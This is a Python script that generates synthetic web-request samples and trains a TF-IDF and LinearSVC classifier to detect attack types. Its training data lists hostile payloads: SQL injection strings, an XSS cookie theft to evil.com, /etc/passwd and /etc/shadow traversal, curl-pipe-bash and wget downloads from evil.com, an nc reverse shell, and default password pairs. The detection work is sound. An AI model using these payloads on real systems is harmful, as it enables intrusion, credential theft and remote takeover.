"""
Classifier Training Pipeline.
Generates synthetic training data from realistic attack signatures and trains
a TF-IDF + LinearSVC pipeline for multi-class attack classification.
"""
import os
import random
import joblib
import numpy as np
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.svm import LinearSVC
from sklearn.calibration import CalibratedClassifierCV
from sklearn.model_selection import train_test_split
from sklearn.metrics import classification_report

CLASSIFIER_PATH = os.path.join(os.path.dirname(__file__), "attack_classifier.joblib")


def _generate_synthetic_data():
    """
    Generate synthetic training samples for each attack category.
    Uses realistic attack signatures from OWASP and common scanners.
    """
    data = []

    # ── SQL Injection ──
    sqli_payloads = [
        "' OR 1=1 --", "' UNION SELECT username,password FROM users --",
        "admin' --", "1; DROP TABLE users;", "' OR ''='",
        "1' AND 1=1 UNION ALL SELECT NULL,NULL,NULL--",
        "' WAITFOR DELAY '0:0:5'--", "1 AND (SELECT * FROM users) = 1",
        "'; EXEC xp_cmdshell('dir');--", "1' ORDER BY 1--",
        "-1' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
        "admin' AND SUBSTRING(password,1,1)='a'--",
        "1; INSERT INTO users(name) VALUES('hacker');",
        "' HAVING 1=1 --", "' GROUP BY columnnames HAVING 1=1 --",
        "'; SELECT BENCHMARK(10000000,SHA1('test'));--",
        "1' AND SLEEP(5)#", "1 UNION SELECT null,table_name FROM information_schema.tables--",
    ]
    sqli_paths = ["/admin-login", "/api/login", "/search", "/user?id=", "/products?q="]
    for payload in sqli_payloads:
        path = random.choice(sqli_paths)
        data.append((f"PATH:{path} METHOD:POST UA:Mozilla/5.0 PAYLOAD:{payload}", "sql_injection"))

    # ── XSS ──
    xss_payloads = [
        '<script>alert("XSS")</script>', '<img src=x onerror=alert(1)>',
        '<svg onload=alert(document.cookie)>', 'javascript:alert(1)',
        '<body onload=alert("xss")>', '<iframe src="javascript:alert(1)">',
        '"><script>document.location="http://evil.com/?c="+document.cookie</script>',
        '<img src=x onerror="eval(atob(\'YWxlcnQoMSk=\'))">', 
        '<div style="background:url(javascript:alert(1))">',
        '<input onfocus=alert(1) autofocus>', '<marquee onstart=alert(1)>',
        '<details open ontoggle=alert(1)>', '<a href="javascript:void(0)" onclick="alert(1)">',
        "'-alert(1)-'", '{{constructor.constructor("alert(1)")()}}',
    ]
    xss_paths = ["/search", "/comment", "/profile", "/contact", "/api/feedback"]
    for payload in xss_payloads:
        path = random.choice(xss_paths)
        data.append((f"PATH:{path} METHOD:POST UA:Mozilla/5.0 PAYLOAD:{payload}", "xss"))

    # ── Directory Traversal / LFI ──
    lfi_payloads = [
        "../../etc/passwd", "../../../etc/shadow", "....//....//etc/passwd",
        "/proc/self/environ", "..%2f..%2f..%2fetc%2fpasswd",
        "php://filter/convert.base64-encode/resource=index.php",
        "file:///etc/passwd", "/var/log/apache2/access.log",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/hosts", "%252e%252e%252fetc%252fpasswd",
        "/boot.ini", "C:\\Windows\\win.ini",
    ]
    lfi_paths = ["/download?file=", "/include?page=", "/view?doc=", "/load?path=", "/.env", "/config.json"]
    for payload in lfi_payloads:
        path = random.choice(lfi_paths) + payload
        data.append((f"PATH:{path} METHOD:GET UA:Mozilla/5.0 PAYLOAD:", "directory_traversal"))
    for p in ["/.env", "/config.json", "/config.yml", "/backup.zip", "/.git/config", "/.htpasswd"]:
        data.append((f"PATH:{p} METHOD:GET UA:curl/7.68.0 PAYLOAD:", "directory_traversal"))

    # ── RCE Attempts ──
    rce_payloads = [
        "; cat /etc/passwd", "| ls -la", "& whoami", "`id`", "$(uname -a)",
        "; wget http://evil.com/shell.sh", "| nc -e /bin/sh 10.0.0.1 4444",
        "eval('__import__(\"os\").system(\"id\")')",
        "exec(\"import os; os.system('whoami')\")",
        "system('cat /etc/passwd');", "passthru('ls -la');",
        "{{7*7}}", "${7*7}", "<%= system('id') %>",
        "; curl http://evil.com/malware.sh | bash",
        "python -c 'import socket,subprocess;s=socket.socket();s.connect((\"10.0.0.1\",4444))'",
    ]
    rce_paths = ["/api/exec", "/cmd", "/ping?host=", "/search", "/api/debug"]
    for payload in rce_payloads:
        path = random.choice(rce_paths)
        data.append((f"PATH:{path} METHOD:POST UA:Python-urllib/3.9 PAYLOAD:{payload}", "rce_attempt"))

    # ── Bot Scanner ──
    scanner_uas = [
        "sqlmap/1.5.2#dev (http://sqlmap.org)",
        "Nmap Scripting Engine; https://nmap.org/book/nse.html",
        "nikto/2.1.6", "Mozilla/5.0 (compatible; Nessus SOAP)",
        "DirBuster-1.0-RC1", "gobuster/3.1.0",
        "WPScan v3.8.22 (https://wpscan.com/)", "Nuclei - Open-source project",
        "masscan/1.3.2", "wfuzz/3.1.0", "Acunetix Web Vulnerability Scanner",
        "python-requests/2.28.0", "Go-http-client/1.1",
        "Java/11.0.11", "libwww-perl/6.61",
    ]
    scanner_paths = ["/wp-admin", "/phpmyadmin", "/.env", "/actuator/health", "/server-status",
                     "/cgi-bin/test", "/manager/html", "/xmlrpc.php", "/wp-login.php", "/console"]
    for ua in scanner_uas:
        path = random.choice(scanner_paths)
        data.append((f"PATH:{path} METHOD:GET UA:{ua} PAYLOAD:", "bot_scanner"))
        data.append((f"PATH:{random.choice(scanner_paths)} METHOD:GET UA:{ua} PAYLOAD:", "bot_scanner"))

    # ── Brute Force ──
    bf_payloads = [
        "username=admin&password=admin", "username=admin&password=password123",
        "username=root&password=toor", "username=admin&password=12345",
        "username=test&password=test", "username=admin&password=admin123",
        "username=administrator&password=letmein", "username=admin&password=qwerty",
        "username=user&password=password", "username=admin&password=changeme",
    ]
    bf_paths = ["/admin-login", "/wp-login.php", "/login", "/api/auth", "/signin"]
    for payload in bf_payloads:
        path = random.choice(bf_paths)
        data.append((f"PATH:{path} METHOD:POST UA:Mozilla/5.0 PAYLOAD:{payload}", "brute_force"))
        # Add variants with different UAs
        data.append((f"PATH:{path} METHOD:POST UA:python-requests/2.28.0 PAYLOAD:{payload}", "brute_force"))

    # ── Credential Stuffing ──
    cs_payloads = [
        '{"email":"user1@leaked.com","password":"leaked_pass1"}',
        '{"email":"user2@leaked.com","password":"leaked_pass2"}',
        '{"username":"jsmith","password":"Summer2024!"}',
        "email=victim@mail.com&password=exposed123",
        '{"login":"admin@company.com","pass":"breach_pass"}',
    ]
    for payload in cs_payloads:
        path = random.choice(bf_paths)
        data.append((f"PATH:{path} METHOD:POST UA:Go-http-client/1.1 PAYLOAD:{payload}", "credential_stuffing"))
        data.append((f"PATH:{path} METHOD:POST UA:python-requests/2.28.0 PAYLOAD:{payload}", "credential_stuffing"))

    # ── Benign ──
    benign_samples = [
        "PATH:/ METHOD:GET UA:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 PAYLOAD:",
        "PATH:/api/users METHOD:GET UA:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) PAYLOAD:",
        "PATH:/about METHOD:GET UA:Mozilla/5.0 (Linux; Android 10) PAYLOAD:",
        "PATH:/contact METHOD:POST UA:Mozilla/5.0 PAYLOAD:name=John&message=Hello",
        "PATH:/api/products METHOD:GET UA:Mozilla/5.0 PAYLOAD:",
        "PATH:/images/logo.png METHOD:GET UA:Mozilla/5.0 PAYLOAD:",
        "PATH:/css/style.css METHOD:GET UA:Mozilla/5.0 PAYLOAD:",
        "PATH:/js/app.js METHOD:GET UA:Mozilla/5.0 PAYLOAD:",
        "PATH:/api/health METHOD:GET UA:kube-probe/1.25 PAYLOAD:",
        "PATH:/robots.txt METHOD:GET UA:Googlebot/2.1 PAYLOAD:",
        "PATH:/sitemap.xml METHOD:GET UA:Bingbot/2.0 PAYLOAD:",
        "PATH:/favicon.ico METHOD:GET UA:Mozilla/5.0 PAYLOAD:",
    ]
    for sample in benign_samples:
        data.append((sample, "benign"))
        # Add duplicates with slight variations
        for _ in range(3):
            data.append((sample, "benign"))

    random.shuffle(data)
    return data


def train_attack_classifier():
    """
    Train the TF-IDF + LinearSVC attack classifier on synthetic data.
    Saves model + vectorizer to disk.
    """
    print("[CLASSIFIER TRAIN] Generating synthetic training data...")
    data = _generate_synthetic_data()

    texts = [d[0] for d in data]
    labels = [d[1] for d in data]

    print(f"[CLASSIFIER TRAIN] Total samples: {len(texts)}")
    for label in set(labels):
        count = labels.count(label)
        print(f"  {label}: {count} samples")

    # TF-IDF with character n-grams to catch obfuscated payloads
    vectorizer = TfidfVectorizer(
        analyzer="char_wb",
        ngram_range=(2, 5),
        max_features=10000,
        sublinear_tf=True
    )

    X = vectorizer.fit_transform(texts)

    # Train with calibration for probability estimates
    X_train, X_test, y_train, y_test = train_test_split(
        X, labels, test_size=0.2, random_state=42, stratify=labels
    )

    base_model = LinearSVC(max_iter=5000, random_state=42, C=1.0)
    calibrated = CalibratedClassifierCV(base_model, cv=3)
    calibrated.fit(X_train, y_train)

    # Evaluate
    y_pred = calibrated.predict(X_test)
    print("\n[CLASSIFIER TRAIN] Evaluation Report:")
    print(classification_report(y_test, y_pred))

    accuracy = np.mean(np.array(y_pred) == np.array(y_test))
    print(f"[CLASSIFIER TRAIN] Accuracy: {accuracy:.3f}")

    # Save
    joblib.dump({"model": calibrated, "vectorizer": vectorizer}, CLASSIFIER_PATH)
    print(f"[CLASSIFIER TRAIN] Model saved to {CLASSIFIER_PATH}")

    return True


if __name__ == "__main__":
    train_attack_classifier()
